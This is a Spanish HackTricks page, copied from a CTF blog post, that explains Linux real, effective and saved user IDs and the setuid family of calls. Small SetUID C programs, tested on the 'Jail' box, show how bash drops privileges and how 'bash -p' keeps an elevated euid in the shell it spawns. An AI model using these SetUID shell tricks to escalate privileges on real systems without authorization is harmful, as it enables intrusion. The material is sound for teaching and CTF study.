# euid, ruid, suid

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Este post fue copiado de** [**https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail**](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail)

## **`*uid`**

* **`ruid`**: Este es el **ID de usuario real** del usuario que inició el proceso.
* **`euid`**: Este es el **ID de usuario efectivo**, es lo que el sistema mira cuando decide **qué privilegios debe tener el proceso**. En la mayoría de los casos, el `euid` será el mismo que el `ruid`, pero un binario SetUID es un ejemplo de un caso en el que difieren. Cuando se inicia un binario SetUID, el **`euid` se establece en el propietario del archivo**, lo que permite que estos binarios funcionen.
* `suid`: Este es el **ID de usuario guardado**, se utiliza cuando un proceso privilegiado (en la mayoría de los casos que se ejecuta como root) necesita **abandonar los privilegios** para realizar algún comportamiento, pero luego necesita **volver** al estado privilegiado.

{% hint style="info" %}
Si un **proceso que no es root** quiere **cambiar su `euid`**, solo puede **establecerlo** en los valores actuales de **`ruid`**, **`euid`** o **`suid`**.
{% endhint %}

## set\*uid

A primera vista, es fácil pensar que las llamadas al sistema **`setuid`** establecerían el `ruid`. De hecho, cuando se trata de un proceso privilegiado, lo hace. Pero en el caso general, en realidad **establece el `euid`**. Según la [página del manual](https://man7.org/linux/man-pages/man2/setuid.2.html):

> setuid() **establece el ID de usuario efectivo del proceso que llama**. Si el proceso que llama tiene privilegios (más precisamente: si el proceso tiene la capacidad CAP\_SETUID en su espacio de nombres de usuario), también se establecen el UID real y el ID de usuario guardado.

Por lo tanto, en el caso en el que se está ejecutando `setuid(0)` como root, esto establece todos los IDs en root y básicamente los bloquea (porque `suid` es 0, pierde el conocimiento o cualquier usuario anterior - por supuesto, los procesos root pueden cambiar a cualquier usuario que deseen).

Dos llamadas al sistema menos comunes, **`setreuid`** (`re` para real y efectivo) y **`setresuid`** (`res` incluye guardado) establecen los IDs específicos. Estar en un proceso no privilegiado limita estas llamadas (de la [página del manual](https://man7.org/linux/man-pages/man2/setresuid.2.html) para `setresuid`, aunque la [página](https://man7.org/linux/man-pages/man2/setreuid.2.html) para `setreuid` tiene un lenguaje similar):

> Un proceso no privilegiado puede cambiar su **UID real, UID efectivo e ID de usuario guardado**, cada uno a uno de: el UID real actual, el UID efectivo actual o el ID de usuario guardado actual.
>
> Un proceso privilegiado (en Linux, uno que tiene la capacidad CAP\_SETUID) puede establecer su UID real, UID efectivo e ID de usuario guardado en valores arbitrarios.

Es importante recordar que estos no están aquí como una característica de seguridad, sino que reflejan el flujo de trabajo previsto. Cuando un programa quiere cambiar a otro usuario, cambia el ID de usuario efectivo para que pueda actuar como ese usuario.

Como atacante, es fácil adquirir el mal hábito de simplemente llamar a `setuid` porque el caso más común es ir a root, y en ese caso, `setuid` es efectivamente lo mismo que `setresuid`.

## Ejecución

### **execve (y otros execs)**

La llamada al sistema `execve` ejecuta un programa especificado en el primer argumento. El segundo y tercer argumento son matrices, los argumentos (`argv`) y el entorno (`envp`). Hay varios otros llamados al sistema que se basan en `execve`, denominados `exec` ([página del manual](https://man7.org/linux/man-pages/man3/exec.3.html)). Cada uno es solo un envoltorio sobre `execve` para proporcionar diferentes abreviaturas para llamar a `execve`.

Hay muchos detalles en la [página del manual](https://man7.org/linux/man-pages/man2/execve.2.html), sobre cómo funciona. En resumen, cuando **`execve` inicia un programa**, utiliza el **mismo espacio de memoria que el programa que llama**, reemplazando ese programa
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    system("id");
    return 0;
}
```
Este programa está compilado y configurado como SetUID en Jail sobre NFS:
```bash
oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;
...[snip]...
oxdf@hacky$ chmod 4755 /mnt/nfsshare/a
```
Como root, puedo ver este archivo:
```
[root@localhost nfsshare]# ls -l a 
-rwsr-xr-x. 1 frank frank 16736 May 30 04:58 a
```
Cuando ejecuto esto como nobody, `id` se ejecuta como nobody:
```bash
bash-4.2$ $ ./a
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
El programa comienza con un `ruid` de 99 (nadie) y un `euid` de 1000 (frank). Cuando llega a la llamada `setuid`, se establecen esos mismos valores.

Luego se llama a `system`, y esperaría ver un `uid` de 99, pero también un `euid` de 1000. ¿Por qué no hay uno? El problema es que **`sh` está vinculado simbólicamente a `bash`** en esta distribución:
```
$ ls -l /bin/sh
lrwxrwxrwx. 1 root root 4 Jun 25  2017 /bin/sh -> bash
```
Entonces, `system` llama a `/bin/sh sh -c id`, que es efectivamente `/bin/bash bash -c id`. Cuando se llama a `bash`, sin `-p`, entonces ve `ruid` de 99 y `euid` de 1000, y establece `euid` en 99.

### setreuid / system <a href="#setreuid--system" id="setreuid--system"></a>

Para probar esa teoría, intentaré reemplazar `setuid` con `setreuid`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setreuid(1000, 1000);
    system("id");
    return 0;
}
```
Compilación y permisos:
```
oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b
```
Ahora en la cárcel, ahora `id` devuelve el uid de 1000:
```
bash-4.2$ $ ./b
uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
La llamada `setreuid` establece tanto `ruid` como `euid` en 1000, por lo que cuando `system` llama a `bash`, coinciden y las cosas continúan como frank.

### setuid / execve <a href="#setuid--execve" id="setuid--execve"></a>

Llamando a `execve`, si mi comprensión anterior es correcta, también podría no preocuparme por manipular los uids y, en su lugar, llamar a `execve`, ya que llevará a cabo los IDs existentes. Eso funcionará, pero hay trampas. Por ejemplo, el código común podría verse así:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/usr/bin/id", NULL, NULL);
    return 0;
}
```
Sin el entorno (estoy pasando NULL para simplificar), necesitaré una ruta completa en `id`. Esto funciona, devolviendo lo que espero:
```
bash-4.2$ $ ./c
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
El `[r]uid` es 99, pero el `euid` es 1000.

Si intento obtener una shell a partir de esto, debo tener cuidado. Por ejemplo, simplemente llamando a `bash`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/bin/bash", NULL, NULL);
    return 0;
}
```
Voy a compilar eso y establecerlo como SetUID:
```
oxdf@hacky$ gcc d.c -o /mnt/nfsshare/d
oxdf@hacky$ chmod 4755 /mnt/nfsshare/d
```
Aún así, esto devolverá todo nobody:
```
bash-4.2$ $ ./d
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
Si fuera `setuid(0)`, entonces funcionaría bien (suponiendo que el proceso tuviera permiso para hacerlo), ya que entonces cambia los tres ids a 0. Pero como usuario no root, esto solo establece el `euid` en 1000 (que ya estaba), y luego llama a `sh`. Pero `sh` es `bash` en Jail. Y cuando `bash` se inicia con `ruid` de 99 y `euid` de 1000, volverá a dejar caer el `euid` a 99.

Para solucionar esto, llamaré a `bash -p`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    setuid(1000);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```
Esta vez el `euid` está presente:
```
bash-4.2$ $ ./e
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
O también podría llamar a `setreuid` o `setresuid` en lugar de `setuid`.
